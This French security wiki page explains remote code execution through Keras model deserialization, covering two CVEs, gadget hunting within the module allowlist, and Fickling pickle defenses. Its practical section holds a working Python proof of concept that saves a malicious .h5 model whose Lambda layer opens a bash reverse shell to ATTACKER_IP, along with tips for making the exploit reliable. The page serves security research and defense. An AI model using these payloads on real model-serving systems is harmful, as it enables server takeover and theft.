# RCE lors de la désérialisation des modèles Keras et recherche de gadgets

{{#include ../../banners/hacktricks-training.md}}

Cette page résume les techniques d'exploitation pratiques visant le pipeline de désérialisation des modèles Keras, explique les composants internes et la surface d'attaque du format natif .keras, et fournit aux chercheurs une boîte à outils pour trouver des Model File Vulnerabilities (MFVs) et des gadgets post-fix.

## Composants internes du format de modèle .keras

Un fichier .keras est une archive ZIP contenant au minimum :<sup>[[1]](#references)</sup>
- metadata.json – informations génériques (par exemple, la version de Keras)
- config.json – architecture du modèle (principale surface d'attaque)
- model.weights.h5 – poids au format HDF5

Le fichier config.json pilote la désérialisation récursive : Keras importe des modules, résout des classes/fonctions et reconstruit des layers/objets à partir de dictionnaires contrôlés par l'attaquant.<sup>[[1]](#references)</sup>

Extrait d'exemple pour un objet de layer Dense :
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
La désérialisation effectue :<sup>[[1]](#references)</sup>
- Import du module et résolution du symbole à partir des clés module/class_name
- Appel de from_config(...) ou du constructeur avec des kwargs contrôlés par l'attaquant
- Récursion dans les objets imbriqués (activations, initializers, constraints, etc.)

Historiquement, cela exposait trois primitives à un attaquant fabriquant config.json :<sup>[[1]](#references)</sup>
- Contrôle des modules importés
- Contrôle des classes/fonctions résolues
- Contrôle des kwargs transmis aux constructeurs/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Cause première :
- La désérialisation legacy de Lambda reconstruisait une fonction Python à partir de code marshaled contrôlé par l'attaquant : `func_load()` décode le payload en base64, appelle `marshal.loads()` et crée une `FunctionType`. Le bytecode de la fonction résultante s'exécute lorsque Lambda est invoqué, et les loaders antérieurs à la version 2.13 concernés n'appliquaient pas les vérifications safe-mode aux formats legacy.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Dans une archive Keras v3 native, la fonction Lambda est représentée par un objet `__lambda__` dont le champ `code` contient du code marshaled encodé en base64 :<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Mitigation :
- Keras impose `safe_mode=True` par défaut pour le format natif Keras v3. Les lambdas Python sérialisées dans `Lambda` sont bloquées, sauf si l’utilisateur désactive explicitement cette protection avec `safe_mode=False` ; cette protection ne couvre pas les formats legacy de la même manière.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notes :
- Les formats legacy (anciens enregistrements HDF5) ou les codebases plus anciennes peuvent ne pas appliquer les vérifications modernes ; les attaques de type « downgrade » peuvent donc toujours fonctionner lorsque les victimes utilisent d’anciens loaders.

## CVE-2025-1550 – Importation arbitraire de modules dans Keras 3.0.0–3.8.x

Cause racine :
- `_retrieve_class_or_fn` utilisait `importlib.import_module(module)` avec des chaînes de modules contrôlées par l’attaquant et provenant de `config.json`.
- Impact : une archive `.keras` spécialement conçue pouvait amener `Model.load_model()` à importer des modules et des fonctions Python choisis par l’attaquant, avec des effets de bord lors de l’importation et des arguments contrôlés par l’attaquant, même avec `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Idée d’exploit :
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Améliorations de sécurité (Keras ≥ 3.9) :<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist : imports restreints aux modules officiels de l’écosystème : keras, keras_hub, keras_cv, keras_nlp
- Safe mode par défaut : safe_mode=True bloque le chargement non sécurisé de fonctions sérialisées de Lambda
- Vérification basique des types : les objets désérialisés doivent correspondre aux types attendus

## Exploitation pratique : TensorFlow-Keras HDF5 (.h5) Lambda RCE

Les déploiements TensorFlow-Keras legacy peuvent toujours accepter des fichiers de modèle HDF5 (`.h5`). Si un attaquant peut upload un modèle que le serveur chargera ultérieurement ou sur lequel il exécutera une inférence, un loader vulnérable peut désérialiser une couche Lambda contenant du code Python contrôlé par l’attaquant, qui peut ensuite s’exécuter dans le workflow de modèle de l’application.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

PoC minimal pour créer un fichier .h5 malveillant dont le Lambda exécute un reverse shell lorsque la cible invoque le modèle :
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notes et conseils de fiabilité :
- Les points de déclenchement varient selon le format et le workflow ; l’article référencé a observé que le payload s’exécutait deux fois pendant la prediction. Considérez les side effects comme répétables et rendez les payloads idempotents.<sup>[[7]](#references)</sup>
- Pinning des versions : faites correspondre les versions de TF/Keras/Python de la victime afin d’éviter les incompatibilités de sérialisation. Par exemple, construisez les artifacts avec Python 3.8 et TensorFlow 2.13.1 si c’est ce qu’utilise la cible.<sup>[[7]](#references)</sup>
- Réplication rapide de l’environnement :
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validation : une payload inoffensive comme `os.system("ping -c 1 YOUR_IP")` aide à confirmer l’exécution (par exemple, en observant l’ICMP avec tcpdump) avant de passer à un reverse shell.<sup>[[7]](#references)</sup>

## Surface des gadgets après correction dans l’allowlist

Même avec l’allowlist des modules Keras et le safe mode, les callables autorisés peuvent exposer des effets de bord. Par exemple, `keras.utils.get_file` télécharge une URL et l’écrit dans l’emplacement de cache configuré, ce qui en fait un candidat pour l’analyse de gadgets.<sup>[[1]](#references)[[19]](#references)</sup>

Configuration Lambda candidate (validez la signature de l’appel dans un test contrôlé) :
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitation importante :
- `Lambda.call()` transmet toujours l’entrée du modèle comme premier argument positionnel et les `arguments` configurés comme arguments nommés. Pour `get_file`, cette valeur positionnelle remplit `fname` ; une incompatibilité tensor/chemin peut faire échouer ce candidat avant tout téléchargement, il ne s’agit donc pas d’un gadget garanti fonctionnel.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## ML pickle import allowlisting for AI/ML models (Fickling)

De nombreux formats de modèles AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, artefacts joblib/scikit-learn et autres formats natifs Python) intègrent des données Python pickle. L’ancienne voie Keras Lambda ci-dessus utilise à la place du bytecode de fonction marshalé ; il s’agit donc d’un risque de désérialisation distinct. Les opcodes pickle peuvent déclencher un comportement contrôlé par l’attaquant pendant la désérialisation, notamment une falsification du modèle ou une RCE, et les scanners simples peuvent manquer des imports dangereux nouveaux ou non répertoriés.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Une défense pratique en mode fail-closed consiste à intercepter le désérialiseur pickle de Python et à n’autoriser, pendant le unpickling, qu’un ensemble vérifié d’imports inoffensifs liés au ML. Le Fickling de Trail of Bits implémente cette politique et fournit une allowlist d’imports ML soigneusement établie à partir de milliers de pickles publics provenant de Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Modèle de sécurité pour les imports « sûrs » (intuitions synthétisées à partir de la recherche et de la pratique) : les symboles importés utilisés par un pickle doivent simultanément :<sup>[[8]](#references)</sup>
- Ne pas exécuter de code ni provoquer d’exécution (aucun objet de code compilé ou source, aucune exécution de commandes shell, aucun hook, etc.)
- Ne pas obtenir ni définir des attributs ou des éléments arbitraires
- Ne pas importer d’autres objets Python depuis la pickle VM ni obtenir de références vers ceux-ci
- Ne déclencher aucun désérialisateur secondaire (par ex. marshal, pickle imbriqué), même indirectement

Activez les protections de Fickling le plus tôt possible au démarrage du processus afin que tous les chargements pickle effectués par les frameworks (`torch.load`, `joblib.load`, etc.) soient vérifiés :<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Conseils opérationnels :
- Vous pouvez temporairement désactiver/réactiver les hooks si nécessaire :<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Si un modèle réputé fiable est bloqué, étendez la allowlist pour votre environnement après avoir examiné les symboles :<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling expose également des protections génériques lors de l’exécution si vous préférez un contrôle plus granulaire :<sup>[[9]](#references)</sup>
- `fickling.always_check_safety()` pour imposer des vérifications à tous les `pickle.load()`
- `with fickling.check_safety():` pour une application limitée à une portée donnée
- `fickling.load(path)` / `fickling.is_likely_safe(path)` pour des vérifications ponctuelles

- Privilégiez les formats de modèles autres que pickle lorsque cela est possible (par ex., SafeTensors).<sup>[[15]](#references)</sup> Si vous devez accepter pickle, exécutez les loaders avec les privilèges minimaux, sans sortie réseau, et imposez l’allowlist.

Cette stratégie basée en premier lieu sur l’allowlist bloque de manière démontrable les chemins d’exploitation courants des fichiers pickle ML tout en maintenant une compatibilité élevée. Dans le benchmark de ToB, Fickling a détecté 100 % des fichiers malveillants synthétiques et a autorisé environ 99 % des fichiers sains provenant des principaux repos Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Boîte à outils du Researcher

1) Découverte systématique de gadgets dans les modules autorisés

Énumérez les callables candidats dans keras, keras_nlp, keras_cv, keras_hub et donnez la priorité à ceux qui ont des effets de bord sur les fichiers, le réseau, les processus ou l’environnement.<sup>[[1]](#references)</sup>

<details>
<summary>Énumérer les callables potentiellement dangereux dans les modules Keras de l’allowlist</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Tests de désérialisation directe (aucune archive .keras nécessaire)

Injectez des dictionnaires conçus directement dans les désérialiseurs Keras afin d’identifier les paramètres acceptés et d’observer les effets secondaires.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Tests interversions et formats

Keras existe dans plusieurs codebases/époques, avec des protections et des formats différents :<sup>[[1]](#references)</sup>
- Keras intégré à TensorFlow : tensorflow/python/keras (legacy, voué à être supprimé)
- tf-keras : maintenu séparément
- Keras 3 multi-backend (official) : a introduit le format natif .keras

Répétez les tests sur les différentes codebases et les différents formats (.keras contre HDF5 legacy) afin de découvrir les régressions ou les protections manquantes.

## References

- [1] [Recherche de vulnérabilités dans la désérialisation des modèles Keras (blog huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [PR Keras #20751 – Ajout de contrôles à la sérialisation](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE via la désérialisation de Keras Lambda](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Import de module arbitraire dans Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Rapport huntr – import arbitraire #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Rapport huntr – import arbitraire #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE TensorFlow .h5 Lambda vers root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Blog Trail of Bits – Nouveau scanner de fichiers pickle AI/ML de Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Sécurisation des environnements AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Corpus de référence pour le scan de pickles Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Contexte des attaques Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Projet SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Les couches Lambda de Keras 2 permettent l’injection de code arbitraire](https://kb.cert.org/vuls/id/253266)
- [17] [Code source de la couche Lambda de Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Code source des utilitaires Python de Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API `get_file` de Keras](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
